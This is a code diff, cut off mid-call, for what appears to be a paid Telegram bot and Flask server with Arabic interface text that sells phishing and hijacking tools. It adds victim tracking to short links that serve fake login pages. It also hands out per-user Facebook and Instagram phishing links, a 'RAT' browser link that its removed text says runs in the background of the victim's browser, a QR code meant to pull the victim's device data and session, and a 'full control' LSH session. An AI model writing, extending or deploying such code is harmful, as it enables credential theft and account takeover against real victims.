@@ -96,6 +96,36 @@ except Exception as e:
     def sh_generate_login_page(*a, **kw): return "Error: session_hunter not loaded"
 
 # ============================================================
+# ★★★ استيراد Victims Manager ★★★
+# ============================================================
+try:
+    from victims_manager import (
+        create_victim,
+        get_victim,
+        get_all_victims,
+        delete_victim,
+        update_victim_status,
+        rename_victim,
+        get_victim_by_code,
+        add_creds_to_victim,
+        get_victim_creds,
+    )
+    VICTIMS_ENABLED = True
+    print("[+] victims_manager imported")
+except Exception as e:
+    print(f"[-] Error importing victims_manager: {e}")
+    VICTIMS_ENABLED = False
+    def create_victim(*a, **kw): return None
+    def get_victim(*a, **kw): return None
+    def get_all_victims(*a, **kw): return []
+    def delete_victim(*a, **kw): return False
+    def update_victim_status(*a, **kw): return False
+    def rename_victim(*a, **kw): return False
+    def get_victim_by_code(*a, **kw): return None
+    def add_creds_to_victim(*a, **kw): return False
+    def get_victim_creds(*a, **kw): return []
+
+# ============================================================
 # استيراد نظام الدفع + الأدمن
 # ============================================================
 try:
@@ -244,14 +274,11 @@ app = Flask(__name__)
 
 
 # ============================================================
-# Origin Gate — حماية من الوصول المباشر
+# Origin Gate
 # ============================================================
 ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")
 
-ORIGIN_GATE_EXEMPT = [
-    '/',
-    '/health',
-]
+ORIGIN_GATE_EXEMPT = ['/', '/health']
 
 @app.before_request
 def verify_origin():
@@ -269,7 +296,6 @@ def verify_origin():
     return jsonify({
         "error": "Access denied",
         "message": "This endpoint requires the official application",
-        "hint": "Please use the official link"
     }), 403
 
 
@@ -282,47 +308,12 @@ def health_check():
 
 
 # ============================================================
-# ★★★ نظام الرابط القصير ★★★
+# توليد كود قصير
 # ============================================================
 def generate_short_code(length=8):
-    """يولّد كود قصير (8 أحرف)"""
     import random
     chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
     return ''.join(random.choices(chars, k=length))
-
-
-def save_short_link(code, chat_id, site):
-    """يحفظ كود مختصر في Redis"""
-    if not redis_client:
-        return False
-    try:
-        ttl = 86400 * 7
-        redis_client.setex(
-            f"short:{code}",
-            ttl,
-            json.dumps({
-                "chat_id": str(chat_id),
-                "site": site,
-                "created_at": time.time()
-            })
-        )
-        return True
-    except Exception as e:
-        print(f"[-] save_short_link error: {e}")
-        return False
-
-
-def get_short_link(code):
-    """يجلب بيانات كود مختصر"""
-    if not redis_client:
-        return None
-    try:
-        raw = redis_client.get(f"short:{code}")
-        if raw:
-            return json.loads(raw)
-    except Exception as e:
-        print(f"[-] get_short_link error: {e}")
-    return None
 
 
 # ============================================================
@@ -351,13 +342,11 @@ register_payment_handlers(bot)
 
 
 # ============================================================
-# ★★★ مسار الرابط القصير: /f/XXXXXXXX ★★★
-# ★★★ يولّد الصفحة مباشرة (بدون redirect) ★★★
+# ★★★ مسار الرابط القصير — يربط الضحية ★★★
 # ============================================================
 @app.route('/f/<code>', methods=['GET'])
 def short_link_show(code):
     """يستقبل الرابط القصير ويعرض الصفحة مباشرة"""
-    # جلب بيانات الكود
     meta = get_short_link(code)
     if not meta:
         return """<!DOCTYPE html>
@@ -369,28 +358,42 @@ h1{color:#e11d48}</style></head>
     
     chat_id = str(meta.get("chat_id"))
     site = meta.get("site", "facebook")
+    victim_id = meta.get("victim_id", "")
+    victim_name = meta.get("name", "")
     
-    # ★★★ ولّد session_id حقيقي (24 حرف) ★★★
+    # ولّد session_id
     session_id = uuid.uuid4().hex[:24]
     
-    # ★★★ احفظ الجلسة في Redis ★★★
+    # احفظ الجلسة في Redis
     if redis_client:
         try:
             redis_client.setex(
                 f"sh_session:{session_id}",
                 86400 * 7,
-                json.dumps({"chat_id": chat_id, "target_site": site})
+                json.dumps({
+                    "chat_id": chat_id,
+                    "target_site": site,
+                    "victim_id": victim_id,
+                    "victim_name": victim_name,
+                })
             )
         except Exception as e:
             print(f"[-] Redis save session error: {e}")
     
-    # ★★★ أنشئ الجلسة في الذاكرة ★★★
+    # حدّث حالة الضحية
+    if victim_id and VICTIMS_ENABLED:
+        try:
+            update_victim_status(chat_id, victim_id, "active")
+        except Exception:
+            pass
+    
+    # أنشئ الجلسة
     try:
         sh_create_session(session_id, chat_id, site)
     except Exception as e:
         print(f"[-] sh_create_session error: {e}")
     
-    # ★★★ ولّد صفحة تسجيل الدخول مباشرة (بدون redirect) ★★★
+    # ولّد الصفحة
     try:
         html = sh_generate_login_page(session_id, chat_id, site)
         return html, 200
@@ -398,8 +401,20 @@ h1{color:#e11d48}</style></head>
         print(f"[-] sh_generate_login_page error: {e}")
         import traceback
         traceback.print_exc()
-        # fallback
         return f"<h1>Error: {e}</h1>", 500
+
+
+def get_short_link(code):
+    """يجلب بيانات كود مختصر"""
+    if not redis_client:
+        return None
+    try:
+        raw = redis_client.get(f"short:{code}")
+        if raw:
+            return json.loads(raw)
+    except Exception as e:
+        print(f"[-] get_short_link error: {e}")
+    return None
 
 
 # ============================================================
@@ -426,51 +441,36 @@ def payment_menu():
     return build_main_payment_keyboard()
 
 
-# ============================================================
-# رسائل مساعدة
-# ============================================================
 def _deny_message(reason, user_id, tool, data=None):
     data = data or {}
     if reason == "banned":
-        return (
-            "🚫 **أنت محظور من استخدام البوت.**\n\n"
-            "إذا كنت تعتقد أن هذا خطأ، تواصل مع الإدارة."
-        )
+        return "🚫 **أنت محظور من استخدام البوت.**"
     if reason == "daily_limit_reached":
-        return (
-            "⚠️ **وصلت للحد اليومي لباقتك الحالية.**\n\n"
-            f"🎯 الحد اليومي: {data.get('daily_limit', 0)} عملية\n"
-            "💎 قم بترقية باقتك أو انتظر لليوم التالي."
-        )
+        return f"⚠️ **وصلت للحد اليومي** ({data.get('daily_limit', 0)})."
     if reason == "no_credit":
         return (
-            "❌ **لا يوجد لديك استخدام متاح لهذه الأداة.**\n\n"
-            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني فقط عند التسجيل.\n"
-            "💎 اشترك في إحدى الباقات للاستمرار.\n\n"
-            "اضغط على 💎 الاشتراكات والدفع لعرض الباقات."
+            "❌ **لا يوجد لديك استخدام متاح.**\n\n"
+            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني.\n"
+            "💎 اشترك للاستمرار."
         )
-    return "❌ لا يمكن استخدام الأداة حالياً."
+    return "❌ لا يمكن استخدام الأداة."
 
 
 # ============================================================
-# Start Command
+# Start
 # ============================================================
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
     print(f"[+] /start from {message.from_user.id}")
     user_name = message.from_user.first_name
-    get_or_create_user(
-        message.from_user.id,
-        message.from_user.username or "Unknown",
-        user_name
-    )
+    get_or_create_user(message.from_user.id, message.from_user.username or "Unknown", user_name)
     
     if is_admin(message.from_user.id):
         text = (
             f"👑 **مرحباً أيها الأدمن {user_name}!**\n\n"
-            f"⚡ لديك صلاحيات كاملة على النظام.\n"
-            f"💎 أنت VIP لا نهائي — كل الأدوات مفتوحة بدون حدود.\n\n"
-            f"🎛️ استخدم **لوحة تحكم الأدمن** للتحكم الكامل."
+            f"⚡ صلاحيات كاملة على النظام.\n"
+            f"💎 VIP لا نهائي — كل الأدوات مفتوحة.\n\n"
+            f"🎛️ استخدم **لوحة تحكم الأدمن**."
         )
     else:
         text = (
@@ -479,12 +479,8 @@ def start_command(message):
             f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
         )
     
-    bot.send_message(
-        message.chat.id,
-        text,
-        parse_mode="Markdown",
-        reply_markup=main_menu(message.from_user.id)
-    )
+    bot.send_message(message.chat.id, text, parse_mode="Markdown",
+                     reply_markup=main_menu(message.from_user.id))
 
 
 # ============================================================
@@ -496,28 +492,18 @@ def callback_handler(call):
     user_id = call.from_user.id
 
     # ============================================================
-    # قسم الدفع
+    # الدفع
     # ============================================================
     if call.data == "payment_menu":
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            "💎 **قسم الاشتراكات والدفع**\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "اختر ما تريد:",
-            parse_mode="Markdown",
-            reply_markup=build_main_payment_keyboard()
-        )
+        bot.send_message(chat_id, "💎 **قسم الاشتراكات والدفع**\n━━━━━━━━━━━━━━━━━━\nاختر:",
+                         parse_mode="Markdown", reply_markup=build_main_payment_keyboard())
         return
 
     if call.data == "show_plans":
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            build_plans_text(),
-            parse_mode="Markdown",
-            reply_markup=build_plans_keyboard()
-        )
+        bot.send_message(chat_id, build_plans_text(), parse_mode="Markdown",
+                         reply_markup=build_plans_keyboard())
         return
 
     if call.data.startswith("buy_plan_"):
@@ -533,11 +519,7 @@ def callback_handler(call):
 
     if call.data == "back_to_main":
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            "القائمة الرئيسية:",
-            reply_markup=main_menu(user_id)
-        )
+        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu(user_id))
         return
 
     # ============================================================
@@ -545,391 +527,210 @@ def callback_handler(call):
     # ============================================================
     if call.data == "admin_panel":
         if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ أنت لست أدمن", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
             return
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            "👑 **لوحة تحكم الأدمن**\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "اختر العملية المطلوبة:",
-            reply_markup=build_admin_menu(),
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, "👑 **لوحة تحكم الأدمن**\n━━━━━━━━━━━━━━━━━━",
+                         reply_markup=build_admin_menu(), parse_mode="Markdown")
         return
 
     if call.data.startswith("admin_users_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
             return
-        try:
-            page = int(call.data.replace("admin_users_", ""))
-        except ValueError:
-            page = 0
+        try: page = int(call.data.replace("admin_users_", ""))
+        except: page = 0
         users = get_all_users()
         if not users:
             bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
             return
         users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            f"👥 **قائمة المستخدمين** ({len(users)})\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"اختر مستخدم لعرض التفاصيل:",
-            reply_markup=build_admin_users_keyboard(users, page),
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, f"👥 **قائمة المستخدمين** ({len(users)})",
+                         reply_markup=build_admin_users_keyboard(users, page), parse_mode="Markdown")
         return
 
     if call.data.startswith("admin_user_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
             return
-        try:
-            uid = int(call.data.replace("admin_user_", ""))
-        except ValueError:
-            bot.answer_callback_query(call.id, "❌ رقم خاطئ", show_alert=True)
-            return
+        try: uid = int(call.data.replace("admin_user_", ""))
+        except: return
         user = get_user(uid)
         if not user:
-            bot.answer_callback_query(call.id, "❌ مستخدم غير موجود", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
             return
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            build_user_info_text(uid, user),
-            reply_markup=build_user_detail_keyboard(uid, user),
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, build_user_info_text(uid, user),
+                         reply_markup=build_user_detail_keyboard(uid, user), parse_mode="Markdown")
         return
 
     if call.data.startswith("admin_ban_user_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_ban_user_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_ban_user_", ""))
+        except: return
         ban_user(uid)
         bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
-        user = get_user(uid)
-        if user:
-            try:
-                bot.edit_message_text(
-                    build_user_info_text(uid, user),
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    reply_markup=build_user_detail_keyboard(uid, user),
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
         return
 
     if call.data.startswith("admin_unban_user_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_unban_user_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_unban_user_", ""))
+        except: return
         unban_user(uid)
         bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
-        user = get_user(uid)
-        if user:
-            try:
-                bot.edit_message_text(
-                    build_user_info_text(uid, user),
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    reply_markup=build_user_detail_keyboard(uid, user),
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
         return
 
     if call.data.startswith("admin_grant_vip_user_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_grant_vip_user_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_grant_vip_user_", ""))
+        except: return
         user = get_or_create_user(uid)
         user["is_vip"] = True
         save_user(uid, user)
         bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
         try:
-            bot.send_message(uid,
-                "💎 **تهانينا!**\n\n"
-                "تم منحك عضوية **VIP** من الإدارة.\n"
-                "يمكنك الآن استخدام كل الأدوات بدون أي حدود! 🚀",
-                parse_mode="Markdown")
-        except Exception:
-            pass
-        user = get_user(uid)
-        if user:
-            try:
-                bot.edit_message_text(
-                    build_user_info_text(uid, user),
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    reply_markup=build_user_detail_keyboard(uid, user),
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
+            bot.send_message(uid, "💎 **تهانينا!** تم منحك VIP! 🚀", parse_mode="Markdown")
+        except: pass
         return
 
     if call.data.startswith("admin_remove_vip_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_remove_vip_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_remove_vip_", ""))
+        except: return
         user = get_or_create_user(uid)
         user["is_vip"] = False
         save_user(uid, user)
         bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
-        user = get_user(uid)
-        if user:
-            try:
-                bot.edit_message_text(
-                    build_user_info_text(uid, user),
-                    chat_id=chat_id,
-                    message_id=call.message.message_id,
-                    reply_markup=build_user_detail_keyboard(uid, user),
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
         return
 
     if call.data.startswith("admin_delete_user_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_delete_user_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_delete_user_", ""))
+        except: return
         delete_user(uid)
         bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
-        try:
-            bot.edit_message_text(
-                f"🗑️ **تم حذف المستخدم** `{uid}`",
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                parse_mode="Markdown"
-            )
-        except Exception:
-            pass
         return
 
     if call.data.startswith("admin_give_sub_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_give_sub_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_give_sub_", ""))
+        except: return
         bot.answer_callback_query(call.id)
         markup = InlineKeyboardMarkup()
         markup.row(
-            InlineKeyboardButton("⭐ أساسية (30 يوم)", callback_data=f"admin_activate_basic_{uid}"),
-            InlineKeyboardButton("💎 احترافية (30 يوم)", callback_data=f"admin_activate_pro_{uid}"),
+            InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
+            InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
         )
-        markup.row(
-            InlineKeyboardButton("👑 VIP (90 يوم)", callback_data=f"admin_activate_vip_{uid}"),
-        )
+        markup.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
         markup.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
-        bot.send_message(
-            chat_id,
-            f"📅 **اختر الباقة للمستخدم** `{uid}`",
-            reply_markup=markup,
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, f"📅 **اختر الباقة** `{uid}`",
+                         reply_markup=markup, parse_mode="Markdown")
         return
 
     if call.data.startswith("admin_activate_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         parts = call.data.replace("admin_activate_", "").rsplit("_", 1)
-        if len(parts) != 2:
-            return
+        if len(parts) != 2: return
         plan_key, uid_str = parts
-        try:
-            uid = int(uid_str)
-        except ValueError:
-            return
+        try: uid = int(uid_str)
+        except: return
         try:
             user = activate_subscription(uid, plan_key)
             plan = PRICING_PLANS.get(plan_key)
-            bot.answer_callback_query(call.id, f"✅ تم تفعيل {plan['name']}", show_alert=True)
+            bot.answer_callback_query(call.id, f"✅ {plan['name']}", show_alert=True)
             try:
                 from datetime import datetime as _dt
                 expires = _dt.fromisoformat(user["subscription"]["expires_at"])
-                bot.send_message(uid,
-                    f"🎉 **تم تفعيل اشتراكك!**\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"💎 الباقة: {plan['name']}\n"
-                    f"📅 ينتهي في: `{expires.strftime('%Y-%m-%d')}`\n"
-                    f"🎯 الحد اليومي: {plan['daily_limit']} عملية",
-                    parse_mode="Markdown")
-            except Exception:
-                pass
+                bot.send_message(uid, f"🎉 **تم تفعيل اشتراكك!**\n📅 ينتهي: `{expires.strftime('%Y-%m-%d')}`",
+                                 parse_mode="Markdown")
+            except: pass
         except Exception as e:
-            bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)
+            bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
         return
 
     if call.data == "admin_stats":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            build_admin_stats_text(),
-            reply_markup=InlineKeyboardMarkup().add(
-                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
-            ),
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, build_admin_stats_text(),
+                         reply_markup=InlineKeyboardMarkup().add(
+                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
+                         ), parse_mode="Markdown")
         return
 
     if call.data == "admin_recent":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         users = get_all_users()
         users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
         recent = users[:10]
-        lines = ["🆕 **آخر 10 مستخدمين:**\n━━━━━━━━━━━━━━━━━━"]
+        lines = ["🆕 **آخر 10 مستخدمين:**"]
         for u in recent:
             uid = u.get("user_id")
             name = u.get("first_name", "Unknown")
-            created = u.get("created_at", "")[:19].replace("T", " ")
             icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
-            lines.append(f"{icon} **{name}** — `{uid}`\n   📅 {created}")
+            lines.append(f"{icon} **{name}** — `{uid}`")
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
-            "\n".join(lines),
-            reply_markup=InlineKeyboardMarkup().add(
-                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
-            ),
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, "\n".join(lines),
+                         reply_markup=InlineKeyboardMarkup().add(
+                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
+                         ), parse_mode="Markdown")
         return
 
     if call.data == "admin_search":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "🔍 **أرسل ID المستخدم أو username للبحث:**",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "🔍 **أرسل ID أو username:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_search_handler)
         return
 
     if call.data == "admin_broadcast":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "📢 **أرسل الرسالة التي تريد إرسالها للجميع:**",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "📢 **أرسل الرسالة:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_broadcast_handler)
         return
 
-    if call.data == "admin_add_sub":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "➕ **أرسل ID المستخدم لإضافة باقة له:**",
-            parse_mode="Markdown")
-        bot.register_next_step_handler(msg, admin_add_sub_handler)
-        return
-
     if call.data == "admin_ban":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "🚫 **أرسل ID المستخدم لحظره:**",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "🚫 **أرسل ID للحظر:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_ban_handler)
         return
 
     if call.data == "admin_unban":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "✅ **أرسل ID المستخدم لفك حظره:**",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "✅ **أرسل ID لفك الحظر:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_unban_handler)
         return
 
     if call.data == "admin_delete":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "🗑️ **أرسل ID المستخدم لحذفه نهائياً:**",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "🗑️ **أرسل ID للحذف:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_delete_handler)
         return
 
     if call.data == "admin_grant_vip":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "💎 **أرسل ID المستخدم لمنحه VIP:**",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "💎 **أرسل ID لمنح VIP:**", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_grant_vip_handler)
         return
 
     if call.data == "admin_give_stars":
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
+        if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id,
-            "⭐ **أرسل بالشكل:** `user_id|amount`\n"
-            "مثال: `123456|100`",
-            parse_mode="Markdown")
+        msg = bot.send_message(chat_id, "⭐ **أرسل:** `user_id|amount`", parse_mode="Markdown")
         bot.register_next_step_handler(msg, admin_give_stars_handler)
         return
 
     if call.data.startswith("admin_msg_user_"):
-        if not is_admin(user_id):
-            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
-            return
-        try:
-            uid = int(call.data.replace("admin_msg_user_", ""))
-        except ValueError:
-            return
+        if not is_admin(user_id): return
+        try: uid = int(call.data.replace("admin_msg_user_", ""))
+        except: return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id, f"📨 **أرسل الرسالة للمستخدم** `{uid}`:", parse_mode="Markdown")
+        msg = bot.send_message(chat_id, f"📨 **أرسل الرسالة لـ** `{uid}`:", parse_mode="Markdown")
         bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
         return
 
@@ -938,7 +739,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # توليد فيسبوك
+    # Facebook
     # ============================================================
     if call.data == "gen_fb":
         check = can_use_tool(chat_id, "fb")
@@ -947,13 +748,13 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "fb")
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
+        bot.answer_callback_query(call.id, "جاري التجهيز...")
         link = f"{PUBLIC_URL}/login.php?id={chat_id}"
-        bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
+        bot.send_message(chat_id, f"🎯 رابط فيسبوك:\n `{link}` ", parse_mode="Markdown")
         return
 
     # ============================================================
-    # توليد انستقرام
+    # Instagram
     # ============================================================
     if call.data == "gen_ig":
         check = can_use_tool(chat_id, "ig")
@@ -962,13 +763,13 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "ig")
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
+        bot.answer_callback_query(call.id, "جاري التجهيز...")
         link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
-        bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
+        bot.send_message(chat_id, f"📸 رابط انستقرام:\n `{link}` ", parse_mode="Markdown")
         return
 
     # ============================================================
-    # توليد RAT
+    # RAT
     # ============================================================
     if call.data == "gen_rat":
         check = can_use_tool(chat_id, "rat")
@@ -977,18 +778,13 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "rat")
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي...")
+        bot.answer_callback_query(call.id, "جاري التجهيز...")
         link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
-        bot.send_message(
-            chat_id,
-            f"📱 رابط المراقبة والتحكم الخلفي المطور جاهز:\n `{link}` \n\n"
-            "بمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.",
-            parse_mode="Markdown"
-        )
+        bot.send_message(chat_id, f"📱 رابط RAT:\n `{link}`", parse_mode="Markdown")
         return
 
     # ============================================================
-    # توليد QR
+    # QR
     # ============================================================
     if call.data == "gen_qr":
         check = can_use_tool(chat_id, "qr")
@@ -997,32 +793,23 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "qr")
-        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
+        bot.answer_callback_query(call.id, "جاري التجهيز...")
         token = str(uuid.uuid4())[:8]
         if redis_client:
-            try:
-                redis_client.setex(f"qr_token:{token}", 300, chat_id)
-            except Exception as e:
-                print(f"Redis write error: {e}")
-
+            try: redis_client.setex(f"qr_token:{token}", 300, chat_id)
+            except: pass
         target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
         qr_image = generate_qr_code_bytes(target_link)
         if qr_image:
             qr_image.name = 'pairing_qr.jpg'
-            bot.send_photo(
-                chat_id,
-                qr_image,
-                caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\n"
-                        "بمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز "
-                        "وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
-                parse_mode="Markdown"
-            )
+            bot.send_photo(chat_id, qr_image,
+                caption="📷 **امسح الـ QR:**", parse_mode="Markdown")
         else:
-            bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
+            bot.send_message(chat_id, f"🎯 رابط QR:\n`{target_link}`", parse_mode="Markdown")
         return
 
     # ============================================================
-    # توليد LSH
+    # LSH
     # ============================================================
     if call.data == "gen_lsh":
         check = can_use_tool(chat_id, "lsh")
@@ -1031,55 +818,30 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "lsh")
-        bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")
-
+        bot.answer_callback_query(call.id, "جاري التجهيز...")
         session_id = str(uuid.uuid4()).replace('-', '')[:24]
         if redis_client:
-            try:
-                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
-            except Exception as e:
-                print(f"[-] Redis setex LSH error: {e}")
-
+            try: redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
+            except: pass
         try:
-            requests.post(
